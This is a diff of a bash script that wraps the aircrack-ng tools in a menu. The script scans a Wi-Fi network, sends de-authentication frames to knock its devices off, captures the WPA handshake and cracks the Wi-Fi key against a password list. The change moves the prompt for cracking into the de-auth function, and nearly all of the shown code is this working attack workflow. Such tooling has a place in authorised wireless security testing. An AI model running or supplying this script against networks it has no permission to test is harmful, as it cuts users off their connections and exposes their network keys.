@@ -196,7 +196,7 @@ start () {
 		echo ""
 		echo "-- SELECT OPERATION --"
 		echo "[1] See devices connected to network"
-		echo "[2] Perform de-auth attack on network"
+		echo "[2] De-auth devices on network and crack Wi-Fi key"
 		echo "[3] Quit"
 		echo ""
 		read -p "Select operation [1-3]: " choose
@@ -206,8 +206,6 @@ start () {
 			sudo airodump-ng $interfaceMon --bssid $ap --channel $channel -a
 		elif [ "$choose" == "2" ]; then
 			read -p "De-auth requests (default is 1): " number
-			echo ""
-			read -p "Try to crack WiFi password (y/n)? " capture
 			echo ""
 			deAuth
 		else
@@ -255,8 +253,6 @@ start () {
 	  echo ""
 		read -p "De-auth requests (default is 1): " number
 		echo ""
-		read -p "Try to crack WiFi password (y/n)? " capture
-		echo ""
 		deAuth
 	else
 		echo "-- New target --"
@@ -264,7 +260,6 @@ start () {
 		read -p "Client MAC address (leave empty for every device): " client
 		read -p "Channel: " channel
 		read -p "De-auth requests (default is 1): " number
-		read -p "Try to crack WiFi password (y/n)? " capture
 		read -p "Save target for later (y/n)? " save
 
 		if [ "$save" == "y" ] || [ "$save" == "Y" ]
@@ -284,13 +279,24 @@ start () {
 }
 
 deAuth () {
-  sudo airmon-ng start $interfaceMon $channel > /dev/null
 
-  if [ "$number" == "" ] # default de-auth requests is 1
-  	then
+	# start interface on channel
+	sudo airmon-ng start $interfaceMon $channel > /dev/null
+
+	# if -f flag is specifed ask if password should be cracked
+	if [ "$filePath" != "" ]; then
+			read -p "Try to crack WiFi password (y/n)? " capture
+	else
+			echo "${yellow}NOTE: No password file specified. Run ./aircrack.sh -i <pass_list> to perform key attack.${reset}"
+			echo ""
+	fi
+
+	# default de-auth requests is 1
+  if [ "$number" == "" ]; then
   		number=1
   fi
 
+  # start capture for key crack
   if [ "$capture" == "y" ] || [ "$capture" == "Y" ]
   then
   	echo "-- Starting handshake capture --"
@@ -309,6 +315,7 @@ deAuth () {
 		sudo aireplay-ng -0 $number -a $ap -c $client $interfaceMon
 	fi
 
+	# stop capture and crack key
 	if [ "$capture" == "y" ] || [ "$capture" == "Y" ]
   then
   	echo ""
@@ -317,12 +324,6 @@ deAuth () {
 		sudo killall screen
 		echo ""
 		echo "-- Cracking Wi-Fi key --"
-		if [ "$filePath" = "" ]
-			then
-				echo "${red}ERROR: No password file specified."
-				showHelp
-				exit
-			fi
   	sudo aircrack-ng capture-01.cap -w $filePath
   fi
 
